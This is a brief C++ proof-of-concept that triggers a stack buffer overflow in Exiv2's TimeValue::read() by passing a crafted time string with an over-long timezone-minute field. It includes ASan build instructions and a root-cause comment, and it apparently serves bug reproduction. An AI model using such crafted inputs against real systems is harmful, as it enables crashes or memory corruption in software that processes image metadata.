// Stack-buffer-overflow PoC for TimeValue::read() timezone-minute parsing.
//
// Build (against the patched tree):
//   g++ -std=c++20 -fsanitize=address -g -O0 pocs/newbug.cpp src/value.cpp \
//       src/types.cpp src/error.cpp -Iinclude -Iinclude/exiv2 -Isrc \
//       -I<fmt-shim-or-system-fmt> -o pocs/newbug
//
// Run:
//   ./pocs/newbug
//
// Exercises only the public Exiv2::TimeValue::read(std::string) API with an
// ISO-8601-looking "HH:MM:SS-HHMMMM" time string (extended time, basic/no-colon
// timezone offset). The timezone-minute remainder after the 3-char sign+hour
// prefix is copied into a fixed 3-byte stack buffer without checking that it
// actually fits, overflowing the buffer whenever the offset's minute field is
// longer than 2 digits.
#include <exiv2/value.hpp>
#include <iostream>

int main() {
  Exiv2::TimeValue value;
  const std::string hms("14:30:00-000000");
  int rc = value.read(hms);
  std::cout << "read() returned " << rc << "\n";
  return 0;
}
